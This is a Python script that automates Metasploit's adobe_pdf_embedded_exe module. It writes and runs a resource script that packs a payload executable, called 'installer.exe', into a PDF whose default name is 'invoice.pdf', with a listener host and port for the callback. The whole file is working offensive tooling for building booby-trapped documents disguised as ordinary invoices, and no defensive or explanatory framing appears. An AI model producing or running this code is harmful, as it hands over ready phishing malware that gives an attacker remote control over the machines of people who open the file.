import os
import subprocess
import shutil

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RES_DIR = os.path.join(ROOT, "resources")
OUTPUT_DIR = os.path.join(ROOT, "output")

RC_EXPLOIT = """use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set FILENAME {filename}
{template_line}
set EXE_NAME installer.exe
exploit
exit
"""

def generate_adobe_pdf_exploit(payload, lhost, lport, filename="invoice.pdf", template_pdf=None):
    if not shutil.which("msfconsole"):
        print("[x] msfconsole not found. Install Metasploit first.")
        return None

    os.makedirs(RES_DIR, exist_ok=True)
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    rc_path = os.path.join(RES_DIR, "adobe_exploit.rc")
    template_line = f"set INFILENAME {template_pdf}" if template_pdf and os.path.exists(template_pdf) else ""

    rc_content = RC_EXPLOIT.format(
        payload=payload,
        lhost=lhost,
        lport=lport,
        filename=filename,
        template_line=template_line
    )

    with open(rc_path, "w") as f:
        f.write(rc_content)

    print(f"[*] Running Metasploit adobe_pdf_embedded_exe module...")
    print(f"[*] Payload: {payload}")
    print(f"[*] Output: {filename}")

    result = subprocess.run(
        f"msfconsole -q -r \"{rc_path}\"",
        shell=True, capture_output=True, text=True
    )

    print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)

    # Metasploit saves to its default location or CWD
    possible_paths = [
        os.path.join(os.getcwd(), filename),
        os.path.join(OUTPUT_DIR, filename),
        os.path.expanduser(f"~/.msf4/local/{filename}"),
        os.path.expanduser(f"~/.msf4/data/{filename}"),
    ]

    for p in possible_paths:
        if os.path.exists(p):
            dest = os.path.join(OUTPUT_DIR, filename)
            shutil.move(p, dest)
            print(f"[+] PDF created: {dest}")
            return dest

    print("[x] PDF file not found after exploitation. Check msfconsole output.")
    return None

def generate_adobe_resource_script(payload, lhost, lport, filename="invoice.pdf", template_pdf=None):
    """
    Instead of running the module directly (which can be flaky),
    generate the .rc script so user can inspect and run manually if needed.
    """
    os.makedirs(RES_DIR, exist_ok=True)
    rc_path = os.path.join(RES_DIR, "adobe_exploit.rc")
    template_line = f"set INFILENAME {template_pdf}" if template_pdf else ""

    rc_content = RC_EXPLOIT.format(
        payload=payload,
        lhost=lhost,
        lport=lport,
        filename=filename,
        template_line=template_line
    )

    with open(rc_path, "w") as f:
        f.write(rc_content)

    print(f"[+] Adobe Reader exploit RC: {rc_path}")
    print(f"[*] To run manually: msfconsole -q -r \"{rc_path}\"")
    return rc_path
